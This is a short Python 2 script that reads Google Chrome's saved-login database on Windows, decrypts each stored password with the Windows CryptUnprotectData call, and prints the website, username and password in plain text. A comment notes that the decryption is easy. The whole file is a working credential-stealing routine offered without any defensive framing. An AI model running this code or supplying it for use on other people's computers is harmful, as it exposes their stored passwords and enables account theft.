from os import getenv
import sqlite3
import win32crypt

appdata = getenv("APPDATA") 
connection = sqlite3.connect(appdata + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = connection.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for information in cursor.fetchall():
        #chrome encrypts the password with Windows WinCrypt.
	#Fortunately Decrypting it is no big issue.
        password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
	if password:
		print 'website_link ' + information[0]
		print 'Username: ' + information[1]
		print 'Password: ' + password
